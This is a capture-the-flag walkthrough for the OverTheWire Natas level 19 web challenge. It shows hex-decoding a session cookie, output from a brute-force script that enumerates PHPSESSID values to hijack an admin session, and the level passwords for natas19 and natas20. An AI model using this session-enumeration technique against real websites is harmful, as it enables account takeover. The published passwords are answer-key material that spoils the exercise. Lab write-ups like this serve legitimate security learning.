# Natas19 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
URL:      http://natas19.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- This is the same level as previous one except cookie is now Hex encoded.
  
  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas19/cookie.png"/>

  ```
  $ python3 Hex-Encode-Decode.py  
  What you wanna do? encode or decode? decode
  Enter Hex string for decoding: 3236342d61646d696e
  Decode Hex value: 264-admin
  ```

- So you need to brute force all the numbers and add `-admin` to it, then hex encode it!

  ```
  $ python3 hex-cookie-brute.py                                                         
  [*] Tried session ID 0 (302d61646d696e)
  [*] Tried session ID 1 (312d61646d696e)
  [*] Tried session ID 2 (322d61646d696e)
  [*] Tried session ID 3 (332d61646d696e)
  [*] Tried session ID 4 (342d61646d696e)
  [*] Tried session ID 5 (352d61646d696e)
  [*] Tried session ID 6 (362d61646d696e)
  [*] Tried session ID 7 (372d61646d696e)
  [*] Tried session ID 8 (382d61646d696e)
  [*] Tried session ID 9 (392d61646d696e)
  [*] Tried session ID 10 (31302d61646d696e)
  [SNIP!]
  [*] Tried session ID 279 (3237392d61646d696e)
  [*] Tried session ID 280 (3238302d61646d696e)
  [+] Found admin session cookie: 281
  [+] Cookie found: (PHPSESSID: 3238312d61646d696e)
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
  <body>
  <h1>natas19</h1>
  <div id="content">
  <p>
  <b>
  This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
  </b>
  </p>
  You are an admin. The credentials for the next level are:<br><pre>Username: natas20
  Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
  </body>
  </html>
  ```

---

## 🏁 Password for the next level

`Password for natas20 is: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
